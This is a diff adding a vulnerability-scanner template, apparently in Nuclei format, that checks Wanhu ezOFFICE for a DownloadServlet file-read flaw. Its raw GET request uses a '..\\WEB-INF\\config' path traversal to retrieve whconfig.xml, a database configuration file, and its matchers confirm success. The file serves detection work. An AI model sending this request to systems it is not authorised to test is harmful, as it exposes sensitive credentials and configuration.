@@ -1,0 +1,29 @@
+id: wanhu-ezoffice-downloadservlet-file-read
+
+info:
+  name: Wanhu ezOFFICE /defaultroot/DownloadServlet File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    ezOFFICE is an office software suite designed to provide a series of office application tools to help users perform tasks such as document processing, data analysis, communication, and collaboration. This vulnerability allows attackers to read important system files, such as database configuration files, exposing sensitive information.
+  tags: file-read
+
+http:
+  - raw:
+      - |
+        GET /defaultroot/DownloadServlet?key=&path=..\\WEB-INF\\config&FileName=whconfig.xml&name=whconfig.xml HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "EzOffice"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
